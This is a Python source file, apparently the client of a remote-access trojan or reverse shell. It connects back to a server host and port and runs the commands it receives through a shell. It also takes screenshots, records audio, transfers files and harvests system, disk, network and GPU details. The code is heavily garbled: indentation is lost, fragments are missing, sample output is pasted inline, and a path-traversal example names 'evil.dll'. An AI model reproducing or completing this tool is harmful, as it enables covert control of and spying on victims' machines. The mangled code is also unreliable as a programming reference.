import socket, os, subprocess, sys, re, platform, tqdm
from datetime import datetime

try:
    import pyautogui
except KeyError:
    # for some machine that do not have display (i.e cloud Linux machines)
    # simply do not import
    pyautogui_imported = False
else:
    pyautogui_imported = True

import sounddevice as sd
from tabulate import tabulate
from scipy.io import wavfile
import psutil, GPUtil

SERVER_HOST = sys.argv[1]
SERVER_PORT = 5003
BUFFER_SIZE = 1440  # max size of messages, setting to 1440 after experimenta-
                    # tion, MTU size

# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"
class Client:
def __init__(self, host, port, verbose=False):
self.host = host
self.port = port
self.verbose = verbose
self.socket = self.connect_to_server()
self.cwd = None
def connect_to_server(self, custom_port=None):
    # create the socket object
self.socket
s = socket.socket()
if custom_port:
    port = custom_port
else:
    port = self.port
if self.verbose:
    print(f"Connecting to {self.host}:{port}")
s.connect((self.host, port))
if self.verbose:
    print("Connected.")

return s
self.socket
self.cwd = os.getcwd()
self.socket.send(self.cwd.encode())
while True:
command = self.socket.recv(BUFFER_SIZE).decode()
output = self.handle_command(command)
#Connect → Identify → Wait → Execute → Respond → Repeat
if output == "abort":
    break
elif output in ["exit", "quit"]:
    continue
self.cwd = os.getcwd()
message = f"{output}{SEPARATOR}{self.cwd}"
self.socket.sendall(message.encode())
self.socket.close()
def handle_command(self, command):
print(f"Executing command: {command}")
if command.lower() in ["exit", "quit"]:
    output = "exit"
elif command.lower() == "abort":
    output = "abort"
output = self.change_directory(match.group(1))
#cd <path>
elif (match := re.search(r"screenshot\s*(\w*)", command)):
#screenshot
#screenshot filename
if pyautogui_imported:
    output = self.take_screenshot(match.group(1))
else:
    output = "Display is not supported in this machine."
# seconds are not passed, going for 5 seconds as default
seconds = 5
output = self.record_audio(audio_filename, seconds=seconds)
elif (match := re.search(r"sysinfo.*", command)):
    # extract system & hardware information
    output = Client.get_sys_hardware_info()
else:
    # execute the command and retrieve the results
    output = subprocess.getoutput(command)

return output
except FileNotFoundError as e:
    # if there is an error, set as the output
    output = str(e)
else:
    # if operation is successful, empty message
    output = ""

return output
#os.chdir(path)
def take_screenshot(self, output_path):
#img = pyaut
if self.verbose:
    print(output)
return output
img.save(output_path)
#"Image saved to <path>.png"
def receive_file(self, port=5002):
    # connect to the server using another port
    s = self.connect_to_server(custom_port=port)
    # receive the actual file
    Client._receive_file(s, verbose=self.verbose)
@classmethod
def _receive_file(cls, s: socket.socket, buffer_size=4096, verbose=False):
#received = s.recv(buffer_size).decode()
#filename, filesize = received.split(SEPARATOR)
#<filename><SEPARATOR><filesize>
#filename = os.path.basename(filename)
#../../Windows/System32/evil.dll
filesize = int(filesize)
if verbose:
    progress = tqdm.tqdm(
        range(filesize),
        f"Receiving {filename}",
bytes_read = s.recv(buffer_size)
if not bytes_read:
    break
f.write(bytes_read)
if verbose:
    progress.update(len(bytes_read))
s.close()
@classmethod
def _send_file(cls, s: socket.socket, filename, buffer_size=4096, verbose=False):
filesize = os.path.getsize(filename)
s.send(f"{filename}{SEPARATOR}{filesize}".encode())
#<filename><SEPARATOR><filesize>
progress = tqdm.tqdm(
    range(filesize),
    f"Sending {filename}",
    unit="B",
    unit_scale=True,
    unit_divisor=1024
)progress = None
with open(filename, "rb") as f:
while True:
    bytes_read = f.read(buffer_size)
    if not bytes_read:
        break
s.sendall(bytes_read)
@classmethod
def get_sys_hardware_info(cls):
Client.get_sys_hardware_info()
def get_size(bytes, suffix="B"):
factor = 1024
for unit in ["", "K", "M", "G", "T", "P"]:
    if bytes < factor:
        return f"{bytes:.2f}{unit}{suffix}"
    bytes /= factor
output = ""
output += "=" * 40 + "System Information" + "=" * 40 + "\n"
#========================================System Information========================================
uname = platform.uname()
output += f"System: {uname.system}\n"
output += f"Node Name: {uname.node}\n"
output += f"Release: {uname.release}\n"
output += f"Version: {uname.version}\n"
output += f"Machine: {uname.machine}\n"
output += f"Processor: {uname.processor}\n"
output += "=" * 40 + "Boot Time" + "=" * 40 + "\n"
boot_time_timestamp = psutil.boot_time()
bt = datetime.fromtimestamp(boot_time_timestamp)
output += f"Boot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}\n"
for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
    output += f"Core {i}: {percentage}%\n"
Core 0: 12.5%
Core 1: 8.3%
partitions = psutil.disk_partitions()
for partition in partitions:
    output += f"=== Device: {partition.device} ===\n"
    output += f" Mountpoint: {partition.mountpoint}\n"
    output += f" File system type: {partition.fstype}\n"
try:
    partition_usage = psutil.disk_usage(partition.mountpoint)
except PermissionError:
    continue
output += f" Total Size: {get_size(partition_usage.total)}\n"
output += f" Used: {get_size(partition_usage.used)}\n"
output += f" Free: {get_size(partition_usage.free)}\n"
output += f" Percentage: {partition_usage.percent}%\n"
disk_io = psutil.disk_io_counters()
output += f"Total read: {get_size(disk_io.read_bytes)}\n"
output += f"Total write: {get_size(disk_io.write_bytes)}\n"
for address in interface_addresses:
    output += f"=== Interface: {interface_name} ===\n"
if str(address.family) == 'AddressFamily.AF_INET':
    output += f" IP Address: {address.address}\n"
    output += f" Netmask
gpus = GPUtil.getGPUs()
gpu_load = f"{gpu.load * 100} %"
gpu_free_memory  = f"{gpu.memoryFree} MB"
gpu_used_memory  = f"{gpu.memoryUsed} MB"
gpu_total_memory = f"{gpu.memoryTotal} MB"
gpu_temperature = f"{gpu.temperature} °C"
gpu_id   = gpu.id
gpu_name = gpu.name
gpu_uuid = gpu.uuid
list_gpus.append((
    gpu_id,
    gpu_name,
    gpu_load,
    gpu_free_memory,
    gpu_used_memory,
    gpu_total_memory,
    gpu_temperature,
    gpu_uuid
))
output
if __name__ == "__main__":
# while True:
#     # keep connecting to the server forever
#     try:
#         client = Client(SERVER_HOST, SERVER_PORT, verbose=True)
#         client.start()
#     except Exception as e:
#         print(e)
client = Client(SERVER_HOST, SERVER_PORT)
client.start()
#launch → connect → identify → wait → execute → respond → exit


